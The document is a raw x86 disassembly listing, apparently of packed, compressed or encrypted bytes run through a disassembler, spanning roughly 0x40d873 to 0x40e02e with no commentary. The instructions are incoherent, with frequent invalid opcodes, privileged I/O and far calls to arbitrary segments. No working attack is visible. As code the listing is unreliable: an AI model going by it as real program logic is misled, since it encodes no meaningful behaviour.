  40d873:	mov    esp,0xf0c33d10
  40d878:	inc    esi
  40d879:	mov    ch,BYTE PTR [edi+eiz*4-0x7]
  40d87d:	and    ebx,esp
  40d87f:	adc    BYTE PTR [esi-0x1b],dh
  40d882:	mov    bh,0x97
  40d884:	mov    cl,0x85
  40d886:	adc    eax,0x59517c87
  40d88b:	jg     0x40d879
  40d88d:	les    esi,FWORD PTR [edx-0x30b16459]
  40d893:	jnp    0x40d83c
  40d895:	pop    esp
  40d896:	jge    0x40d85a
  40d898:	mov    cl,0xb7
  40d89a:	mov    bh,0x82
  40d89c:	cdq    
  40d89d:	mov    edx,0xada17791
  40d8a2:	sti    
  40d8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8a4:	dec    ebp
  40d8a5:	dec    esi
  40d8a6:	bound  edx,QWORD PTR [edi]
  40d8a8:	daa    
  40d8a9:	push   cs
  40d8aa:	sub    esi,DWORD PTR es:[edx+0x18136108]
  40d8b1:	xor    eax,esp
  40d8b3:	fadd   st,st(6)
  40d8b5:	push   edi
  40d8b6:	push   cs
  40d8b7:	cmp    DWORD PTR [edx-0x1b552674],esi
  40d8bd:	test   BYTE PTR [esi+0xb8db1a6],cl
  40d8c3:	mov    esi,0x2f22284a
  40d8c8:	aam    0xc9
  40d8ca:	cmp    edi,DWORD PTR [edi]
  40d8cc:	(bad)  
  40d8cd:	or     esp,ecx
  40d8cf:	sub    eax,0xe91f7be3
  40d8d4:	inc    esp
  40d8d5:	repz (bad) 
  40d8d7:	jno    0x40d90c
  40d8d9:	or     esi,eax
  40d8db:	shr    cl,1
  40d8dd:	in     eax,dx
  40d8de:	rcr    BYTE PTR es:[ecx+0x4565da0c],cl
  40d8e5:	cmp    ah,al
  40d8e7:	push   edi
  40d8e8:	cli    
  40d8e9:	mov    eax,ds:0x4fb2e929
  40d8ee:	adc    dh,dl
  40d8f0:	and    al,BYTE PTR [esi+esi*2+0x39]
  40d8f4:	and    al,0xa
  40d8f6:	clc    
  40d8f7:	adc    bh,BYTE PTR [ecx]
  40d8f9:	pop    ecx
  40d8fa:	dec    edi
  40d8fb:	in     al,dx
  40d8fc:	arpl   bx,sp
  40d8fe:	mov    edi,0x3cb4b2f3
  40d903:	xchg   BYTE PTR [esi],cl
  40d905:	sbb    al,0x5a
  40d907:	dec    ebp
  40d908:	ja     0x40d921
  40d90a:	pop    ebx
  40d90b:	inc    edi
  40d90c:	mov    ds:0xd9d2063b,al
  40d911:	inc    ecx
  40d912:	call   0xf7f8:0x699324ec
  40d919:	add    eax,0x420da7b1
  40d91e:	push   0xfffffffc
  40d920:	fld    TBYTE PTR [eax+0x74]
  40d923:	imul   ecx,DWORD PTR [esi-0x3c58fa6f],0xe5e2d85
  40d92d:	jo     0x40d900
  40d92f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d930:	(bad)  
  40d931:	nop
  40d932:	aaa    
  40d933:	push   esp
  40d934:	adc    al,0x8d
  40d936:	out    0x4a,al
  40d938:	mov    dl,0x93
  40d93a:	mov    ebp,0x43656891
  40d93f:	pushf  
  40d940:	xchg   ecx,eax
  40d941:	or     ecx,DWORD PTR [esi+0x6e]
  40d944:	mov    esi,0xe1770943
  40d949:	dec    eax
  40d94a:	call   0x110f:0x5d97743
  40d951:	(bad)  
  40d952:	(bad)  
  40d953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d954:	leave  
  40d955:	popa   
  40d956:	jo     0x40d9a2
  40d958:	cmp    ecx,DWORD PTR [edx+eiz*1]
  40d95b:	jmp    0x40da9801
  40d960:	int3   
  40d961:	sahf   
  40d962:	and    cl,BYTE PTR [eax+eax*1-0x45af445]
  40d969:	or     ecx,esp
  40d96b:	and    dl,BYTE PTR [ecx]
  40d96d:	ret    
  40d96e:	fadd   st(3),st
  40d970:	out    0x35,al
  40d972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d973:	cmc    
  40d974:	jbe    0x40d8fe
  40d976:	sub    ch,ch
  40d978:	pushf  
  40d979:	pusha  
  40d97a:	ja     0x40d993
  40d97c:	bound  esi,QWORD PTR [eax-0x6ada5918]
  40d982:	(bad)  
  40d983:	mov    eax,0x631000b4
  40d988:	dec    edi
  40d989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d98a:	call   0x8be0:0x9e519e78
  40d991:	sub    eax,0xca99a77c
  40d996:	shl    DWORD PTR ds:0xda5c4ed,0xb2
  40d99d:	(bad)  
  40d99e:	mov    eax,0xf04c0c45
  40d9a3:	fld    st(2)
  40d9a5:	add    al,0xa
  40d9a7:	dec    esp
  40d9a8:	jae    0x40d9a8
  40d9aa:	sti    
  40d9ab:	pop    es
  40d9ac:	js     0x40d964
  40d9ae:	sbb    BYTE PTR [edi-0x4865d030],al
  40d9b4:	aad    0xd7
  40d9b6:	jbe    0x40d9fc
  40d9b8:	test   eax,0x7c4f52b1
  40d9bd:	or     edx,DWORD PTR [ebx]
  40d9bf:	jmp    0x40d987
  40d9c1:	cmp    BYTE PTR [edi-0x6bc68645],cl
  40d9c7:	enter  0xa4e4,0xfe
  40d9cb:	pop    es
  40d9cc:	jb     0x40d9e8
  40d9ce:	pop    esp
  40d9cf:	jecxz  0x40da23
  40d9d1:	or     al,BYTE PTR [ecx+0x8292512]
  40d9d7:	xlat   BYTE PTR ds:[ebx]
  40d9d8:	out    dx,al
  40d9d9:	dec    eax
  40d9da:	adc    eax,0x92aa6a98
  40d9df:	sub    al,BYTE PTR ds:0x7f22669a
  40d9e6:	mov    ds:0xaca26ee5,al
  40d9eb:	inc    ebp
  40d9ec:	xor    BYTE PTR [ebx],cl
  40d9ee:	cmp    bl,BYTE PTR ds:0xc4dd0218
  40d9f4:	xor    eax,0xb21f645b
  40d9f9:	xor    eax,0x9676a0f2
  40d9fe:	in     al,dx
  40d9ff:	popf   
  40da00:	adc    al,0x36
  40da02:	mov    dl,0x3c
  40da04:	lods   eax,DWORD PTR ds:[esi]
  40da05:	cmp    ah,BYTE PTR [eax]
  40da07:	addr16 mov bh,0x3d
  40da0a:	retf   0xef87
  40da0d:	xchg   edi,eax
  40da0e:	call   0x421:0xc15e13eb
  40da15:	pop    edx
  40da16:	pop    ebx
  40da17:	mov    cl,0xd0
  40da19:	sbb    edx,esp
  40da1b:	pop    edi
  40da1c:	or     cx,WORD PTR [ebx+0x4609f82e]
  40da23:	push   ds
  40da24:	mov    cl,0x17
  40da26:	fwait
  40da27:	shl    DWORD PTR [ebp-0x3562f735],cl
  40da2d:	daa    
  40da2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da2f:	iret   
  40da30:	mov    dl,0x45
  40da32:	fcmovne st,st(3)
  40da34:	mov    ebx,0xa1c3021a
  40da39:	jle    0x40dab4
  40da3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da3c:	cbw    
  40da3e:	or     BYTE PTR [ebx],al
  40da40:	jbe    0x40da34
  40da42:	mov    eax,ds:0xe5d8b57d
  40da47:	mov    esi,DWORD PTR [eax]
  40da49:	lea    ecx,[edx-0x10]
  40da4c:	cli    
  40da4d:	mov    esp,0xbea3fd4
  40da52:	int3   
  40da53:	xchg   edx,eax
  40da54:	leave  
  40da55:	leave  
  40da56:	enter  0xb156,0x15
  40da5a:	call   0x472c:0xe63c209d
  40da61:	push   esp
  40da62:	shl    DWORD PTR [edx+edi*8+0x276c6897],1
  40da69:	popf   
  40da6a:	or     al,BYTE PTR [esi+0x5]
  40da6d:	or     al,0x91
  40da6f:	imul   ecx,DWORD PTR [esi+0x2d27c198],0xffffffdb
  40da76:	nop
  40da77:	(bad)  
  40da78:	stos   DWORD PTR es:[edi],eax
  40da79:	add    al,0x24
  40da7b:	enter  0xa69b,0x74
  40da7f:	adc    al,0x1a
  40da82:	in     al,0x72
  40da84:	repnz inc eax
  40da86:	jmp    0x81c0978f
  40da8b:	fidivr DWORD PTR [esi]
  40da8d:	dec    ebx
  40da8e:	call   0x4e1ad13c
  40da93:	cwde   
  40da94:	add    ecx,DWORD PTR [edx]
  40da96:	call   0x6db5:0xa82735b
  40da9d:	iret   
  40da9e:	fwait
  40da9f:	mov    ecx,DWORD PTR [ebx+0x5b]
  40daa2:	int3   
  40daa3:	pop    ebp
  40daa4:	and    eax,0xcf60fae6
  40daa9:	or     esp,ebp
  40daab:	mov    ecx,0x4010aed1
  40dab0:	add    BYTE PTR [eax+esi*2-0x7a944d34],0xa6
  40dab8:	js     0x40daab
  40daba:	mov    ds:0xb08cd20,eax
  40dabf:	add    DWORD PTR [ebp+0xa53476d],0xffffffec
  40dac6:	xor    al,0x70
  40dac8:	xchg   esp,eax
  40dac9:	xchg   esp,eax
  40daca:	adc    BYTE PTR [eax+0x6722e2bd],dh
  40dad0:	shl    dh,cl
  40dad2:	fldcw  WORD PTR [ecx]
  40dad4:	cmp    ecx,DWORD PTR [edx]
  40dad6:	mov    ds,WORD PTR [edx]
  40dad8:	sub    al,0xc6
  40dada:	jno    0x40da6f
  40dadc:	mov    ebp,0xacbbafd7
  40dae1:	leave  
  40dae2:	je     0x40da92
  40dae4:	repnz stos BYTE PTR es:[edi],al
  40dae6:	loope  0x40dadd
  40dae8:	fdivr  DWORD PTR [edi-0x53]
  40daeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daec:	adc    dl,BYTE PTR [ebx+0x45]
  40daef:	sbb    DWORD PTR [ecx-0x4d569e36],edi
  40daf5:	(bad)  
  40daf6:	mov    esi,0x15fc7ac3
  40dafb:	in     al,0x74
  40dafd:	add    al,0x65
  40daff:	adc    al,0x0
  40db01:	pop    ebp
  40db02:	cmp    cl,al
  40db04:	inc    esp
  40db05:	xchg   ebp,eax
  40db06:	jbe    0x40dac7
  40db08:	mov    dl,0xa
  40db0a:	test   al,0x70
  40db0c:	xchg   ecx,eax
  40db0d:	out    dx,eax
  40db0e:	adc    al,dl
  40db10:	or     DWORD PTR [ebx],0xf082b6ff
  40db16:	xchg   BYTE PTR [ecx-0x6e],ch
  40db19:	int3   
  40db1a:	call   0x520d:0x8c576799
  40db21:	xchg   DWORD PTR [ecx],ebx
  40db23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db24:	jbe    0x40db08
  40db26:	je     0x40db41
  40db28:	and    eax,0xc287b4c7
  40db2d:	loope  0x40dac9
  40db2f:	xchg   esp,eax
  40db30:	mov    ch,0xde
  40db32:	xchg   ebp,eax
  40db33:	leave  
  40db34:	or     eax,0x9ba60aa7
  40db39:	push   ebp
  40db3a:	inc    esi
  40db3b:	into   
  40db3c:	xchg   edx,eax
  40db3d:	sbb    BYTE PTR [edi-0x39],0xfd
  40db41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db42:	xchg   ebx,eax
  40db43:	add    eax,ebp
  40db45:	add    ebp,DWORD PTR [ebx-0x57]
  40db48:	int    0xb
  40db4a:	jbe    0x40db53
  40db4c:	add    BYTE PTR [ebp-0x412a5805],dl
  40db52:	mov    al,ds:0xbc701604
  40db57:	jmp    0x40db0b
  40db59:	int3   
  40db5a:	mov    DWORD PTR [eax],edi
  40db5c:	and    DWORD PTR [edx+0x3bb99014],ebp
  40db62:	scas   al,BYTE PTR es:[edi]
  40db63:	cwde   
  40db64:	push   ss
  40db65:	in     al,0x90
  40db67:	mov    esi,DWORD PTR [edi-0x1041110a]
  40db6d:	sbb    DWORD PTR [edx-0x1],0xfffffff9
  40db71:	mov    cl,0xcd
  40db73:	test   al,0x57
  40db75:	push   ebp
  40db76:	inc    eax
  40db77:	aas    
  40db78:	repnz adc eax,0x667330d0
  40db7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db7f:	and    bh,0x8b
  40db82:	push   cs
  40db83:	aaa    
  40db84:	push   ss
  40db85:	retf   
  40db86:	outs   dx,DWORD PTR ds:[esi]
  40db87:	and    al,0x4
  40db89:	or     ecx,DWORD PTR [eax-0x28]
  40db8c:	outs   dx,DWORD PTR ds:[esi]
  40db8d:	mov    ch,0x4a
  40db8f:	push   ss
  40db90:	sub    DWORD PTR [eax],0xffffff9a
  40db93:	cli    
  40db94:	sub    BYTE PTR [ebp-0x17],ah
  40db97:	sub    ebp,DWORD PTR [ebx]
  40db99:	out    dx,al
  40db9a:	outs   dx,DWORD PTR ds:[esi]
  40db9b:	push   edi
  40db9c:	or     eax,DWORD PTR fs:[ecx+0x6e]
  40dba0:	int3   
  40dba1:	push   esp
  40dba2:	ror    DWORD PTR [ebx+0x2d952c52],cl
  40dba8:	and    al,0xf6
  40dbaa:	loop   0x40dbd3
  40dbac:	test   BYTE PTR [ecx-0x4e],ch
  40dbaf:	jns    0x40dbbe
  40dbb1:	or     ecx,esp
  40dbb3:	dec    ebp
  40dbb4:	sbb    edi,esi
  40dbb6:	arpl   WORD PTR ds:0xd69aa681,bx
  40dbbc:	cmp    ecx,DWORD PTR [ecx-0x78]
  40dbbf:	add    BYTE PTR [edx+0x564ea606],0x31
  40dbc6:	mul    BYTE PTR [edi-0x28d4eaf7]
  40dbcc:	or     bh,BYTE PTR [edi-0x5db1a018]
  40dbd2:	jmp    0x24e9:0x909bb2d0
  40dbd9:	add    eax,0x9667037
  40dbde:	xchg   esi,eax
  40dbdf:	mov    dl,0x18
  40dbe1:	addr16 inc ecx
  40dbe3:	enter  0x86d3,0xe8
  40dbe7:	ja     0x40db81
  40dbe9:	adc    al,0x95
  40dbeb:	inc    esp
  40dbec:	std    
  40dbed:	mov    ebx,0xe9ba4762
  40dbf2:	daa    
  40dbf3:	and    BYTE PTR [ebp+0x27a79674],0xe6
  40dbfa:	shl    DWORD PTR [edi+ecx*2],1
  40dbfd:	inc    ecx
  40dbfe:	jnp    0x40dbd0
  40dc00:	mov    dl,0x1a
  40dc02:	pop    ss
  40dc03:	mov    ebp,DWORD PTR [edi-0x20bca7bd]
  40dc09:	or     edi,DWORD PTR [ebx]
  40dc0b:	in     eax,0xb5
  40dc0d:	cmp    al,0x6e
  40dc0f:	xchg   ebx,eax
  40dc10:	enter  0x9d76,0x34
  40dc14:	sub    ebp,DWORD PTR [eax+0x5452d0a1]
  40dc1a:	aam    0x83
  40dc1c:	push   cs
  40dc1d:	or     ebp,DWORD PTR [ecx+0x743a7868]
  40dc23:	loop   0x40dbc3
  40dc25:	fstp   DWORD PTR [edx+0x214d1ccd]
  40dc2b:	ficom  DWORD PTR [eax-0x12]
  40dc2e:	dec    ebx
  40dc2f:	fnstenv [ebp+0x25]
  40dc32:	addr16 in al,dx
  40dc34:	or     BYTE PTR [ebx],0x5b
  40dc37:	add    al,0xae
  40dc39:	pop    eax
  40dc3a:	inc    esi
  40dc3b:	aaa    
  40dc3c:	mov    dl,0x5d
  40dc3e:	mov    BYTE PTR [ebp+0x36],bh
  40dc41:	pop    esi
  40dc42:	jmp    0x40dc10
  40dc44:	outs   dx,DWORD PTR ds:[esi]
  40dc45:	or     eax,DWORD PTR [ebp-0x39d4427d]
  40dc4b:	pop    es
  40dc4c:	jmp    0xc1c376fb
  40dc51:	or     DWORD PTR [eax+0x3f9bdd40],esp
  40dc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc58:	or     al,bl
  40dc5a:	add    eax,0x1de853c4
  40dc5f:	jo     0x40dc16
  40dc61:	sbb    DWORD PTR [esi-0x51212786],ebp
  40dc67:	stos   BYTE PTR es:[edi],al
  40dc68:	jb     0x40dcde
  40dc6a:	test   BYTE PTR [edx+eiz*1-0x5276a1f5],dl
  40dc71:	loopne 0x40dc32
  40dc73:	scas   eax,DWORD PTR es:[edi]
  40dc74:	scas   al,BYTE PTR es:[edi]
  40dc75:	dec    ebx
  40dc76:	mov    eax,ds:0xf70bddab
  40dc7b:	xlat   BYTE PTR ds:[ebx]
  40dc7c:	dec    edi
  40dc7d:	fisttp QWORD PTR [esi]
  40dc7f:	xchg   ebp,eax
  40dc80:	stos   DWORD PTR es:[edi],eax
  40dc81:	or     ebx,DWORD PTR [ebx-0x77369c6]
  40dc87:	pop    eax
  40dc88:	mov    ds:0xd5d86899,al
  40dc8e:	sahf   
  40dc8f:	pop    esi
  40dc90:	pusha  
  40dc91:	mov    ebx,0xbf4ed5b
  40dc96:	sbb    esp,esp
  40dc98:	(bad)  
  40dc99:	adc    BYTE PTR [ebp-0x40],bl
  40dc9c:	inc    ebx
  40dc9d:	pushf  
  40dc9e:	call   0x5d2e:0xa809e04e
  40dca5:	sbb    ebx,DWORD PTR ds:0xf2d23ea7
  40dcab:	fisttp WORD PTR [eax+0x5ce25ebd]
  40dcb1:	fistp  DWORD PTR [edx+0x153e64a0]
  40dcb7:	call   0xa825577b
  40dcbc:	loopne 0x40dca8
  40dcbe:	cmp    ebx,DWORD PTR [ebp-0x1d]
  40dcc1:	mov    esi,0x41b2c57e
  40dcc6:	leave  
  40dcc7:	lahf   
  40dcc8:	push   ss
  40dcc9:	inc    esp
  40dcca:	mov    esp,0xb87a0025
  40dccf:	call   0xcb45:0x3a1af21c
  40dcd6:	mov    ?,WORD PTR [edx+edx*2]
  40dcd9:	push   ss
  40dcda:	cli    
  40dcdb:	stos   BYTE PTR es:[edi],al
  40dcdc:	xchg   BYTE PTR [ebx],al
  40dcde:	add    eax,0xcd0bc441
  40dce3:	das    
  40dce4:	cld    
  40dce5:	push   esi
  40dce6:	push   ecx
  40dce7:	sbb    eax,0x889a98a3
  40dcec:	pop    esp
  40dced:	push   edi
  40dcee:	sbb    al,0x66
  40dcf1:	fdivr  DWORD PTR [esi-0x57]
  40dcf4:	(bad)  
  40dcf5:	mov    eax,ds:0xc311fcf3
  40dcfa:	adc    bh,ch
  40dcfc:	sub    al,BYTE PTR [edi]
  40dcfe:	jb     0x40dcf8
  40dd00:	iret   
  40dd01:	cld    
  40dd02:	fwait
  40dd03:	sub    DWORD PTR [ecx+0x25],ebp
  40dd06:	std    
  40dd07:	mov    fs,ecx
  40dd09:	imul   esp,DWORD PTR [edx+0x68],0xffffff90
  40dd0d:	push   cs
  40dd0e:	cmp    ebp,esp
  40dd10:	mov    bl,0x5b
  40dd12:	inc    edi
  40dd13:	addr16 aad 0xb3
  40dd16:	inc    eax
  40dd17:	mov    eax,ds:0xddc3b7b2
  40dd1c:	imul   esp,eax,0xb9f76c1
  40dd22:	sub    ah,cl
  40dd24:	test   eax,0x9e7bce82
  40dd29:	xchg   BYTE PTR [edx-0x26e9be00],bl
  40dd2f:	fbld   TBYTE PTR [ecx+0xaa7e41e]
  40dd35:	mov    edi,DWORD PTR [ebx-0x9]
  40dd38:	mov    eax,0xb2721b29
  40dd3d:	bound  ebp,QWORD PTR [edx]
  40dd3f:	ins    BYTE PTR es:[edi],dx
  40dd40:	ror    DWORD PTR [ebx+0x59],1
  40dd43:	fwait
  40dd44:	sbb    cl,BYTE PTR [ebx]
  40dd46:	mov    WORD PTR [eax-0x52],cs
  40dd49:	les    ebx,FWORD PTR [esi+edx*4]
  40dd4c:	stos   BYTE PTR es:[edi],al
  40dd4d:	mov    bl,0x91
  40dd4f:	outs   dx,BYTE PTR ds:[esi]
  40dd50:	icebp  
  40dd51:	fadd   st,st(6)
  40dd53:	daa    
  40dd54:	loopne 0x40dd54
  40dd56:	cs adc edi,esp
  40dd59:	or     eax,DWORD PTR [edx]
  40dd5b:	cmc    
  40dd5c:	repnz outs dx,BYTE PTR ds:[esi]
  40dd5e:	jp     0x40ddb9
  40dd60:	add    bl,BYTE PTR [edx+ebx*4]
  40dd63:	int    0x34
  40dd65:	push   ebp
  40dd66:	pop    ds
  40dd67:	fimul  DWORD PTR [edi]
  40dd69:	imul   eax,DWORD PTR [eax-0x27cc659],0x6f
  40dd70:	mov    fs,ecx
  40dd72:	cwde   
  40dd73:	test   ch,0xcb
  40dd76:	call   0x3c11:0x723d7fb0
  40dd7d:	(bad)  
  40dd7e:	sbb    eax,0xda2e2ba7
  40dd83:	lock cld 
  40dd85:	cdq    
  40dd86:	xor    DWORD PTR [edx+0x3b87738b],0x33
  40dd8d:	shl    DWORD PTR [edi+eiz*1+0x620d2a86],cl
  40dd94:	xor    al,0x86
  40dd96:	mov    bl,0xa7
  40dd98:	imul   ebp,DWORD PTR [ebx],0x6f
  40dd9b:	scas   al,BYTE PTR es:[edi]
  40dd9c:	mov    ah,0xc
  40dd9e:	out    0x11,al
  40dda0:	push   esi
  40dda1:	sbb    BYTE PTR [edx+0x7716c697],bl
  40dda7:	mov    ds:0xa7977c7e,al
  40ddac:	mov    al,0x3
  40ddae:	(bad)  
  40ddaf:	nop
  40ddb0:	enter  0x16b,0x1e
  40ddb4:	mov    esp,0x28e93bd1
  40ddb9:	retf   
  40ddba:	dec    edx
  40ddbb:	push   0xffffffa4
  40ddbd:	mov    ecx,0x10cdbba6
  40ddc2:	call   0xaad7376e
  40ddc7:	xchg   ebx,eax
  40ddc8:	mov    eax,ds:0xd6d91b1
  40ddcd:	and    ecx,edx
  40ddcf:	daa    
  40ddd0:	out    0x7a,eax
  40ddd2:	inc    ecx
  40ddd3:	retf   0xb8f
  40ddd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd7:	push   esp
  40ddd8:	mov    al,0x92
  40ddda:	adc    al,0x1
  40dddc:	push   ecx
  40dddd:	sub    BYTE PTR [edx-0x5adb2c5a],bl
  40dde3:	scas   al,BYTE PTR es:[edi]
  40dde4:	ret    
  40dde5:	sub    ch,BYTE PTR [edx-0x5a]
  40dde8:	fiadd  DWORD PTR [esi+ebx*2+0x2b8c1dc0]
  40ddef:	jnp    0x40ddd8
  40ddf1:	push   0x1e53d39a
  40ddf6:	retf   
  40ddf7:	or     edx,DWORD PTR [edi+ebp*2]
  40ddfa:	sbb    DWORD PTR [edi-0x4c6fc2de],esp
  40de00:	es mov dh,0x75
  40de03:	sbb    ecx,DWORD PTR [esi+0x4327736e]
  40de09:	stos   DWORD PTR es:[edi],eax
  40de0a:	mov    al,gs:0x9ac67415
  40de10:	daa    
  40de11:	and    al,cl
  40de13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de14:	cwde   
  40de15:	int3   
  40de16:	fisub  WORD PTR [esi-0x35645ad7]
  40de1c:	push   eax
  40de1d:	mov    edi,0x28bb3640
  40de22:	mov    ebx,0xd86b5c1e
  40de27:	sahf   
  40de28:	cdq    
  40de29:	or     ebx,ecx
  40de2b:	jle    0x40de97
  40de2d:	fdiv   QWORD PTR [edi+ecx*4]
  40de30:	inc    esp
  40de31:	outs   dx,DWORD PTR ds:[esi]
  40de32:	call   0x2c5f:0xe9ed2a4e
  40de39:	jmp    0x2b585ca
  40de3e:	xadd   BYTE PTR [eax+0x61],ch
  40de42:	icebp  
  40de43:	inc    BYTE PTR es:[ebx+0x61]
  40de47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de48:	jnp    0x40deac
  40de4a:	mov    ch,0x6f
  40de4c:	es jge 0x40de83
  40de4f:	fld    DWORD PTR [esi]
  40de51:	jno    0x40ddeb
  40de53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de54:	push   esi
  40de55:	inc    edx
  40de56:	cmp    DWORD PTR [edi],ebx
  40de58:	arpl   WORD PTR [edi+0x13],sp
  40de5b:	cmpxchg ebp,esp
  40de5e:	adc    eax,0xe768a564
  40de63:	ds xor eax,0xc38d6ec7
  40de69:	or     dl,BYTE PTR [ebx+0xc]
  40de6c:	clc    
  40de6d:	ret    
  40de6e:	stos   BYTE PTR es:[edi],al
  40de6f:	cmp    BYTE PTR [esi],0xeb
  40de72:	bound  esp,QWORD PTR [ebx-0x4e]
  40de75:	pop    ecx
  40de76:	add    BYTE PTR [edi],cl
  40de78:	in     al,dx
  40de79:	popa   
  40de7a:	pop    esp
  40de7b:	rcl    DWORD PTR [esi+0xb],cl
  40de7e:	lea    ebp,[edx+0x1703b1c]
  40de84:	pop    es
  40de85:	xchg   ebx,eax
  40de86:	mov    eax,ds:0xe88b11c8
  40de8b:	in     eax,dx
  40de8c:	sti    
  40de8d:	in     al,dx
  40de8e:	dec    ebp
  40de8f:	push   0xffffffc4
  40de91:	xor    DWORD PTR [eax-0xf904dd9],eax
  40de97:	add    bl,BYTE PTR [ebp-0x64]
  40de9a:	cmp    BYTE PTR [ecx-0x43],al
  40de9d:	mov    ebx,0xcb06d29c
  40dea2:	mov    eax,0xe77a3004
  40dea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea8:	mov    ebp,0x9ac123cb
  40dead:	jae    0x40def3
  40deaf:	xchg   esi,eax
  40deb0:	and    al,0xc7
  40deb2:	dec    esp
  40deb4:	mov    dl,0x9f
  40deb6:	scas   al,BYTE PTR es:[edi]
  40deb7:	mov    bl,BYTE PTR [ebp+0x1e]
  40deba:	sbb    bh,BYTE PTR [ebx]
  40debc:	xchg   ecx,eax
  40debd:	jecxz  0x40deb9
  40debf:	rcl    DWORD PTR [ecx],cl
  40dec1:	or     esi,esi
  40dec3:	mov    esp,0xc5108fa4
  40dec8:	inc    ecx
  40dec9:	mov    dl,0x9a
  40decb:	loopne 0x40de7d
  40decd:	shl    DWORD PTR [ecx-0x5d],0xa6
  40ded1:	and    ah,BYTE PTR gs:[ebp+ebp*4+0x300935d]
  40ded9:	fiadd  DWORD PTR [edx+0x74]
  40dedc:	xor    esi,DWORD PTR [edx-0x348c1965]
  40dee2:	pop    ebp
  40dee3:	call   0xdb9371f9
  40dee8:	dec    eax
  40dee9:	add    eax,0x65d597e0
  40deee:	pop    edx
  40deef:	je     0x40dea5
  40def1:	adc    eax,0xa922c5a5
  40def6:	mov    esi,0x9d95af43
  40defb:	sbb    DWORD PTR [ebp-0x6f],ecx
  40defe:	xchg   bl,dh
  40df00:	sub    eax,0x4bcecd0b
  40df05:	dec    ecx
  40df06:	outs   dx,DWORD PTR ds:[esi]
  40df07:	icebp  
  40df08:	imul   eax,DWORD PTR [ecx-0xf4da596],0xffffffb5
  40df0f:	std    
  40df10:	hlt    
  40df11:	or     DWORD PTR [edx+0x1826f98a],esp
  40df17:	and    al,dl
  40df19:	pop    es
  40df1a:	test   BYTE PTR [eax+0x149d4e8f],bl
  40df20:	and    DWORD PTR [edx+ecx*4-0x514922c6],ebp
  40df27:	call   0xa3a7:0x89a6ae3
  40df2e:	shl    BYTE PTR [ebp-0x40],0x9
  40df32:	call   0x9c7a:0x427acc1b
  40df39:	arpl   WORD PTR [eax],ax
  40df3b:	rol    DWORD PTR [ebx-0x11a203f5],cl
  40df41:	mov    bl,0x49
  40df43:	push   0xffffffcf
  40df45:	(bad)  
  40df46:	call   0xadac:0xbb78f007
  40df4d:	lahf   
  40df4e:	imul   esp,DWORD PTR [edi-0x3b2b8555],0xa32428d2
  40df58:	pop    esp
  40df59:	es call 0x98:0x8b6129ba
  40df61:	int3   
  40df62:	test   DWORD PTR [edi+0x5d8cd7d6],esp
  40df68:	mov    cs,ecx
  40df6a:	sbb    edi,DWORD PTR [esi]
  40df6c:	pop    edx
  40df6d:	lods   al,BYTE PTR ds:[esi]
  40df6e:	cdq    
  40df6f:	pop    ebx
  40df70:	aaa    
  40df71:	xchg   edi,eax
  40df72:	test   eax,0xfcab4af5
  40df77:	push   0x504e0b18
  40df7c:	retf   
  40df7d:	test   DWORD PTR [ebx-0x4f],edx
  40df80:	xor    edx,esi
  40df82:	call   0x160b:0x4b666135
  40df89:	loopne 0x40dfef
  40df8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df8c:	adc    edx,DWORD PTR [ebp+0x62aded82]
  40df92:	mov    ebp,0xb959bccc
  40df97:	hlt    
  40df98:	xchg   edi,eax
  40df99:	mov    ebp,esp
  40df9b:	(bad)  ds:0x31a75622
  40dfa1:	jb     0x40df48
  40dfa3:	inc    edi
  40dfa4:	pop    eax
  40dfa5:	jmp    0x39f321da
  40dfaa:	(bad)  
  40dfab:	shl    BYTE PTR [ebx+0x565a443d],0xb
  40dfb2:	jbe    0x40e000
  40dfb4:	add    ebx,ebp
  40dfb6:	sbb    al,0x63
  40dfb8:	sub    eax,0x1b6e9b0e
  40dfbd:	xor    edx,ebx
  40dfbf:	outs   dx,DWORD PTR ds:[esi]
  40dfc0:	ss push edx
  40dfc2:	fisub  DWORD PTR [edi]
  40dfc4:	pop    ebx
  40dfc5:	lock mov esi,0x9a40c4eb
  40dfcb:	(bad)  
  40dfcc:	push   0x4f
  40dfce:	das    
  40dfcf:	mov    ebp,0xb07e9d11
  40dfd4:	dec    esi
  40dfd5:	pop    edi
  40dfd6:	call   0x70f8:0xd446d552
  40dfdd:	mov    eax,ds:0x2de1a7af
  40dfe2:	test   al,0x62
  40dfe4:	mov    es,eax
  40dfe6:	jp     0x40e053
  40dfe8:	mov    al,0xe5
  40dfea:	mov    ch,0x57
  40dfec:	push   cs
  40dfed:	and    ebx,DWORD PTR [ebp-0x39]
  40dff0:	aad    0xb2
  40dff2:	nop
  40dff3:	test   eax,0x5b5e89a2
  40dff8:	xor    dh,BYTE PTR [ebp-0x1]
  40dffb:	inc    edx
  40dffc:	and    dl,BYTE PTR [ecx-0x7c80cd66]
  40e002:	mov    esp,0x564edc54
  40e007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e008:	cld    
  40e009:	cmp    ecx,ebp
  40e00b:	mov    ebx,DWORD PTR [ebx+ecx*4+0x11b251ff]
  40e012:	outs   dx,BYTE PTR ds:[esi]
  40e013:	lds    esp,FWORD PTR [esi-0x87fd26d]
  40e019:	or     edx,DWORD PTR [ebx-0x3f1324e4]
  40e01f:	jmp    0xde24:0x179af2e9
  40e026:	ds ins DWORD PTR es:[edi],dx
  40e028:	dec    esi
  40e029:	mov    eax,0x7573a48d
  40e02e:	mov    esi,0x7ab4fa55
